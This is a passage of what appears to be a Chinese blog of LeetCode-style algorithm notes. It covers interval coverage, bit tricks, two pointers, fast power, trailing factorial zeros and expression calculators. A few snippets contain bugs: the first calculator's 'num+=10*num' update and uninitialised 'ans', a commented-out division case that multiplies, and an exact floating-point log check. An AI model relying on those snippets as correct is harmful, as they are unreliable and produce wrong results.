class="line">        for(int i = 0; i &lt;= n; i++) &#123;</span><br><span class="line">            int[] temp = new int[2];</span><br><span class="line">            temp[0] = Math.max(0, i - ranges[i]);</span><br><span class="line">            temp[1] = Math.min(n, i + ranges[i]);</span><br><span class="line">            region[i] = temp;</span><br><span class="line">        &#125;</span><br><span class="line">        // 以左端点为标准进行升序</span><br><span class="line">        Arrays.sort(region, (a, b) -&gt; a[0] == b[0] ? a[1] - b[1] : a[0] - b[0]);</span><br><span class="line"></span><br><span class="line">        // 初始化答案，当前可用最右位置</span><br><span class="line">        int res = 0, right = 0;</span><br><span class="line">        // 初始化当前区间</span><br><span class="line">        int cur = 0;</span><br><span class="line">        // 遍历所有区间</span><br><span class="line">        while(cur &lt; n + 1) &#123;</span><br><span class="line">            // 当前区间无法覆盖到最右的有效工作范围，那么就会存在覆盖不到的间隙</span><br><span class="line">            if(region[cur][0] &gt; right) break;</span><br><span class="line">            // 遍历可以覆盖到已经可用的最右点的下一个可用的最右边点</span><br><span class="line">            int rt = right;</span><br><span class="line">            while(cur &lt; n + 1 &amp;&amp; region[cur][0] &lt;= right) &#123;</span><br><span class="line">                rt = Math.max(rt, region[cur][1]);</span><br><span class="line">                cur ++;</span><br><span class="line">            &#125;</span><br><span class="line">            res ++;</span><br><span class="line">            right = rt;</span><br><span class="line">            // 已经遍历到整个范围</span><br><span class="line">            if(right == n) break;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return right == n ? res : -1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="14-位运算"><a href="#14-位运算" class="headerlink" title="14.位运算"></a>14.位运算</h1><h2 id="位运算实现a-b"><a href="#位运算实现a-b" class="headerlink" title="位运算实现a+b"></a>位运算实现a+b</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">a^b是没有近位的加法</span><br><span class="line">  a 0101</span><br><span class="line">  b 0100</span><br><span class="line">a^b 0001</span><br><span class="line"></span><br><span class="line">a&amp;b&lt;&lt;1 是需要进位后位置</span><br><span class="line"></span><br><span class="line">a=a^b b=a&amp;b&lt;&lt;1 ans=a+b直到b==0</span><br></pre></td></tr></table></figure><h2 id="计算二进制表示的1的个数"><a href="#计算二进制表示的1的个数" class="headerlink" title="计算二进制表示的1的个数"></a>计算二进制表示的1的个数</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">可以使用&gt;&gt;，c++右移uint32是高位补0，有符号数高位补符号位</span><br><span class="line">或者使用性质n&amp;(n-1)可以消除末尾的0，直到n==0</span><br></pre></td></tr></table></figure><h1 id="15-双指针"><a href="#15-双指针" class="headerlink" title="15.双指针"></a>15.双指针</h1><p>双指针和三指针问题一定要定义好<strong>循环不变量</strong></p><p>比如leetcode283将0移动到数组后面，并且保证非0元素顺序一致</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">void moveZeroes(vector&lt;int&gt;&amp; nums) &#123;</span><br><span class="line">    int n=nums.size();</span><br><span class="line">    int fast=0;</span><br><span class="line">    //双指针</span><br><span class="line">    //[0,slow)是已经满足题意的保持顺序的数组</span><br><span class="line">    //slow定在第一个0的位置</span><br><span class="line">    //[slow,fast)为0，fast位置不为0</span><br><span class="line">    int slow=0;</span><br><span class="line">    while(fast&lt;n)</span><br><span class="line">    &#123;</span><br><span class="line">        if(nums[fast]!=0)</span><br><span class="line">        &#123;</span><br><span class="line">            swap(nums[slow],nums[fast]);</span><br><span class="line">            slow++;</span><br><span class="line">            fast++;</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            fast++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="16-数学问题"><a href="#16-数学问题" class="headerlink" title="16.数学问题"></a>16.数学问题</h1><h2 id="阶乘后尾部的0"><a href="#阶乘后尾部的0" class="headerlink" title="阶乘后尾部的0"></a>阶乘后尾部的0</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">n！结果尾数的零是如何产生的？中间结果存在10，比如2x5等。主要由2的倍数与5的倍数组成，而2的倍数比5的倍数要多，因此5的倍数数量为考量结果尾数零的数量的关键。由于某些数包含了数个5的乘积，如：25，50，75，100，...，625等。因此我们可以将输入n不断的除以5直至结果为零，并对中间的结果进行累加，则可得到结果。</span><br><span class="line">以126为例：</span><br><span class="line"></span><br><span class="line">第一次除以5时得到25，表明存在25个包含1个5的数。</span><br><span class="line">再次除以5得到5，表明存在5个包含两个5乘积的数，由于第一个5在第一轮已被计算，因此第二轮只需简单的相加。</span><br><span class="line">同理，第三次除以5得到一，存在一个包含三个5乘积的数。</span><br><span class="line">最后累加，得到126！结果尾数包含31个零的结论</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">int trailingZeroes(int n) &#123;</span><br><span class="line">    int ans=0;</span><br><span class="line">    while(n!=0)</span><br><span class="line">    &#123;</span><br><span class="line">        ans+=n/5;</span><br><span class="line">        n/=5;</span><br><span class="line">    &#125;</span><br><span class="line">    return ans;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="快速幂"><a href="#快速幂" class="headerlink" title="快速幂"></a>快速幂</h2><p>使用O(logn)的时间复杂度求POW(x,n)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">double myPow(double x, long long n) &#123;</span><br><span class="line">    if(n==0)</span><br><span class="line">    &#123;</span><br><span class="line">        return 1;</span><br><span class="line">    &#125;</span><br><span class="line">    if(n&lt;0)</span><br><span class="line">    &#123;</span><br><span class="line">        x=1/x;</span><br><span class="line">        n=-n;</span><br><span class="line">    &#125;</span><br><span class="line">    double res=1;</span><br><span class="line">    while(n)</span><br><span class="line">    &#123;</span><br><span class="line">        if(n%2==1)</span><br><span class="line">        &#123;</span><br><span class="line">            res*=x;</span><br><span class="line">        &#125;</span><br><span class="line">        x*=x;</span><br><span class="line">        n/=2;</span><br><span class="line">    &#125;</span><br><span class="line">    return res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="三的幂"><a href="#三的幂" class="headerlink" title="三的幂"></a>三的幂</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 3 9 27</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">如果n&gt;0并且此时n%3==0显然继续除以3</span><br><span class="line">排除0</span><br><span class="line">1是3的0次方</span><br><span class="line"></span><br><span class="line">或者使用换底公式</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">bool isPowerOfThree(int n) &#123;</span><br><span class="line">    while(n&gt;0&amp;&amp;n%3==0)</span><br><span class="line">    &#123;</span><br><span class="line">    n=n/3;</span><br><span class="line">    &#125;</span><br><span class="line">    return n==1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">bool isPowerOfThree(int n) &#123;</span><br><span class="line">    if(n==0)</span><br><span class="line">    &#123;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">    double a=log10(n)/log10(3);</span><br><span class="line">    return a==floor(a);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="计算器"><a href="#计算器" class="headerlink" title="计算器"></a>计算器</h2><p>只有加减乘除，正数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">给定一个包含正整数、加(+)、减(-)、乘(*)、除(/)的算数表达式(括号除外)，计算其结果。</span><br><span class="line"></span><br><span class="line">表达式仅包含非负整数，+， - ，*，/ 四种运算符和空格  。 整数除法仅保留整数部分。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preSign记录之前的符号，如果是除和乘就把当前的数字和sta的数字计算后加进去；+-分别往sta中push+num或-num</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">int calculate(string s) &#123;</span><br><span class="line">    stack&lt;int&gt; sta;</span><br><span class="line">    int i=0;</span><br><span class="line">    int n=s.size();</span><br><span class="line">    char preSign=&#x27;+&#x27;;</span><br><span class="line">    while(i&lt;n)</span><br><span class="line">    &#123;</span><br><span class="line">        if(s[i]==&#x27; &#x27;)</span><br><span class="line">        &#123;</span><br><span class="line">            i++;</span><br><span class="line">            continue;</span><br><span class="line">        &#125;</span><br><span class="line">        int num=0;</span><br><span class="line">        if(isdigit(s[i]))</span><br><span class="line">        &#123;</span><br><span class="line">            while(i&lt;n&amp;&amp;isdigit(s[i]))</span><br><span class="line">            &#123;</span><br><span class="line">                num+=10*num+(s[i]-&#x27;0&#x27;);</span><br><span class="line">                i++;</span><br><span class="line">            &#125;</span><br><span class="line">            if(preSign==&#x27;+&#x27;)</span><br><span class="line">            &#123;</span><br><span class="line">                sta.push(num);</span><br><span class="line">            &#125;</span><br><span class="line">            else if(preSign==&#x27;-&#x27;)</span><br><span class="line">            &#123;</span><br><span class="line">                sta.push(-num);</span><br><span class="line">            &#125;</span><br><span class="line">            else if(preSign==&#x27;*&#x27;)</span><br><span class="line">            &#123;</span><br><span class="line">                int topval=sta.top();</span><br><span class="line">                sta.pop();</span><br><span class="line">                sta.push(topval*num);</span><br><span class="line">            &#125;</span><br><span class="line">            else if(preSign==&#x27;/&#x27;)</span><br><span class="line">            &#123;</span><br><span class="line">                int topval=sta.top();</span><br><span class="line">                sta.pop();</span><br><span class="line">                sta.push(topval/num);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            preSign=s[i];</span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    int ans;</span><br><span class="line">    while(!sta.empty())</span><br><span class="line">    &#123;</span><br><span class="line">        ans+=sta.top();</span><br><span class="line">        sta.pop();</span><br><span class="line">    &#125;</span><br><span class="line">    return ans;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="递归做法"><a href="#递归做法" class="headerlink" title="递归做法"></a>递归做法</h2><p>由于是递归所以优先级低的+-先判断进入递归<br>因为同等优先级是从左往右 所以递归是从右往左开始扫<br>如果没有符号则说明这个区间里是一个数字 使用stoi返回数字即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">class Solution &#123;</span><br><span class="line">    int cal(string &amp;s, int l, int r) &#123;</span><br><span class="line">        for (int i = r; i &gt;= l; --i) &#123;</span><br><span class="line">            if (s[i] == &#x27;+&#x27;) return cal(s, l, i - 1) + cal(s, i + 1, r);</span><br><span class="line">            if (s[i] == &#x27;-&#x27;) return cal(s, l, i - 1) - cal(s, i + 1, r);</span><br><span class="line">        &#125;</span><br><span class="line">        for (int i = r; i &gt;= l; --i) &#123;</span><br><span class="line">            if (s[i] == &#x27;*&#x27;) return cal(s, l, i - 1) * cal(s, i + 1, r);</span><br><span class="line">            if (s[i] == &#x27;/&#x27;) return cal(s, l, i - 1) / cal(s, i + 1, r);</span><br><span class="line">        &#125;</span><br><span class="line">        return stoi(s.substr(l, r - l + 1));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">   public:</span><br><span class="line">    int calculate(string s) &#123;</span><br><span class="line">        if (s.empty()) return 0;</span><br><span class="line">        return cal(s, 0, s.size() - 1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="计算机通用处理方法"><a href="#计算机通用处理方法" class="headerlink" title="计算机通用处理方法"></a>计算机通用处理方法</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.将中缀表达式转化为后缀表达式，使用shunting-yard algorithm(调度场算法)</span><br><span class="line">2.利用括号的递归性</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">while(队列非空)</span><br><span class="line">    1.单个 or 连续数字：计算它的数值</span><br><span class="line">    2.左括号：让递归计算与它对应的右括号内的数    </span><br><span class="line">    3.运算符号 or 右括号</span><br><span class="line">        前一个运算符是 + ，  它前面的数可以加入res了</span><br><span class="line">        前一个运算符是 - ，  它前面的数可以加进res了，把它后面的数变成负数</span><br><span class="line">        前一个运算符是 * ，  它前面的数还不能加进res，乘到它后面的数</span><br><span class="line">        前一个运算符是 / ，  它前面的数还不能加进res，除到它后面的数</span><br><span class="line"></span><br><span class="line">        把当前运算符更新给【前一个运算符】 </span><br><span class="line">        右括号   本对括号内的数算出来了，返回res</span><br><span class="line">    </span><br><span class="line">别忘了加上本来在等待计算的【运算符前面的数】preNum</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">class Solution &#123;</span><br><span class="line">public:</span><br><span class="line">    //递归程序一定要按照自然的（目标的）顺序去写</span><br><span class="line">    //先有数 然后左括号(递归数完了用符号)</span><br><span class="line">    // 然后符号 然后右括号</span><br><span class="line">    int calculate(string s) &#123;</span><br><span class="line">      int i=0;</span><br><span class="line">      return helper(s,i);</span><br><span class="line">    &#125;</span><br><span class="line">    int helper(string s,int &amp;i)&#123;</span><br><span class="line">     stack&lt;int&gt; st;</span><br><span class="line">     char sign=&#x27;+&#x27;; //第一次为正，要把数字放进去</span><br><span class="line">     int num=0;    //当前的计算值</span><br><span class="line">     int pre=0;   //用于计算乘除时保存前面的值</span><br><span class="line">     for(;i&lt;s.size();i++)&#123;</span><br><span class="line">    if(isdigit(s[i]))  &#123;   //碰到数字了</span><br><span class="line">        if(s[i]==&#x27; &#x27;) s[i]=0;      </span><br><span class="line">        num=10*num+(s[i]-&#x27;0&#x27;); //当前为数字，注意是字符类型</span><br><span class="line">    &#125;</span><br><span class="line">    if(s[i]==&#x27;(&#x27;)&#123;       </span><br><span class="line">        num=helper(s,++i);//下一个数字开始递归</span><br><span class="line">        i++; //递归结束在&#x27;)&#x27; 要i++        </span><br><span class="line">      &#125;</span><br><span class="line">    if((!isdigit(s[i])&amp;&amp;(s[i]!=&#x27; &#x27;))||i==s.size()-1)&#123;  </span><br><span class="line">        //空格不算 s[i]!=&#x27; &#x27;,当s[i]==&#x27;)&#x27;时进入if因为要把num压入栈</span><br><span class="line">         switch(sign)&#123;  //上面的num算出来要push</span><br><span class="line">           case &#x27;+&#x27;: st.push(+num); break;</span><br><span class="line">           case &#x27;-&#x27;: st.push(-num); break;</span><br><span class="line">           case &#x27;*&#x27;: </span><br><span class="line">           pre=st.top();</span><br><span class="line">           st.pop();</span><br><span class="line">           st.push(pre*num);</span><br><span class="line">           break;</span><br><span class="line">           case &#x27;/&#x27;:</span><br><span class="line">           pre=st.top();</span><br><span class="line">           st.pop();</span><br><span class="line">           st.push(pre/num);</span><br><span class="line">           break;</span><br><span class="line">         &#125;</span><br><span class="line">          num=0;</span><br><span class="line">          sign=s[i];// 更新sign,为了下一次的保存与计算</span><br><span class="line">      &#125; </span><br><span class="line">    if(s[i]==&#x27;)&#x27;) break; ////统计完才能跳出循环，不可放到前面的位置 </span><br><span class="line">     &#125;</span><br><span class="line">     int result=0;   //累计当前栈的结果</span><br><span class="line">     while(!st.empty())&#123;</span><br><span class="line">        result=result+st.top();</span><br><span class="line">        st.pop();</span><br><span class="line">    &#125;</span><br><span class="line">    return result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">    //递归程序一定要按照自然的（目标的）顺序去写</span><br><span class="line">    //先有数 然后左括号(递归数完了用符号)</span><br><span class="line">    // 然后符号 然后右括号</span><br><span class="line">    //注意是引用</span><br><span class="line">    int helper(string s,int&amp; j)</span><br><span class="line">    &#123;</span><br><span class="line">        stack&lt;int&gt; sta;</span><br><span class="line">        int n=s.size();</span><br><span class="line">        int num=0;</span><br><span class="line">        char sign=&#x27;+&#x27;;</span><br><span class="line">        while(j&lt;n)</span><br><span class="line">        &#123;</span><br><span class="line">            if(s[j]==&#x27;(&#x27;)</span><br><span class="line">            &#123;</span><br><span class="line">                num=helper(s,++j);</span><br><span class="line">            &#125;</span><br><span class="line">            if(isdigit(s[j]))</span><br><span class="line">            &#123;</span><br><span class="line">                num=10*num+(s[j]-&#x27;0&#x27;);</span><br><span class="line">            &#125;</span><br><span class="line">            //&quot;)&quot;也可以进来，碰到)时进行num进栈</span><br><span class="line">            if(!isdigit(s[j])&amp;&amp;s[j]!=&#x27; &#x27;||j==n-1)</span><br><span class="line">            &#123;</span><br><span class="line">                switch(sign)</span><br><span class="line">                &#123;</span><br><span class="line">                    case &#x27;+&#x27;:</span><br><span class="line">                        sta.push(num);</span><br><span class="line">                        break;</span><br><span class="line">                    case &#x27;-&#x27;:</span><br><span class="line">                        sta.push(-num);</span><br><span class="line">                        break;</span><br><span class="line">/*                     case &#x27;*&#x27;:</span><br><span class="line">                        int tmp=sta.top();</span><br><span class="line">                        sta.pop();</span><br><span class="line">                        sta.push(num*tmp);</span><br><span class="line">                        break;</span><br><span class="line">                    case &#x27;/&#x27;:</span><br><span class="line">                        int tmp1=sta.top();</span><br><span class="line">                        sta.pop();</span><br><span class="line">                        sta.push(num*tmp1);</span><br><span class="line">                        break; </span><br><span class="line">                        */</span><br><span class="line">                &#125;</span><br><span class="line">                num=0;</span><br><span class="line">                sign=s[j]; </span><br><span class="line">            &#125;</span><br><span class="line">            if(s[j]==&#x27;)&#x27;)</span><br><span class="line">            &#123;</span><br><span class="line">                j++;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">            j++;</span><br><span class="line">        &#125;</span><br><span class="line">        int ans=0;</span><br><span class="line">        while(!sta.empty())</span><br><span class="line">        &#123;</span><br><span class="line">            ans+=sta.top();</span><br><span class="line">            sta.pop();  </span><br><span class="line">        &#125;</span><br><span class="line">        return ans;</span><br><span class="line">    &#125;</span><br><span class="line">    int calculate(string s) &#123;</span><br><span class="line">        int j=0;</span><br><span class="line">        return helper(s,j);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>中缀转后缀+后缀相加</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">中缀转后缀注意事项：</span><br><span class="line">有一个符号栈stack&lt;char&gt;，一个输后缀结果的vector&lt;string&gt;</span><br><span class="line">1.碰到数字输出</span><br><span class="line">2.碰到优先级相同的运算符，直接push stack</span><br><span class="line">3.碰到优先级低于栈顶的运算符，将stack中的所有pop并输出到结果中，再将这个符号push进栈</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">后缀相加：</span><br><span class="line">新建一个stack，stack压vector中元素</span><br><span class="line">1.碰到符号从stack中pop出两个，运算后压入</span><br><span class="line">2.循环最后得到的表示结果</span><br><span class="line"></span><br><span class="line">注意string str不能直接用char初始化，使用str(n,char)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;iostream&gt;</span><br><span class="line">#include&lt;bits/stdc++.h&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">bool isPrior(char a,char b)</span><br><span class="line">&#123;</span><br><span class="line">    if(a==&#x27;+&#x27;||a==&#x27;-&#x27;)</span><br><span class="line">    &#123;</span><br><span class="line">        return b==&#x27;*&#x27;||b==&#x27;/&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">    return false;</span><br><span 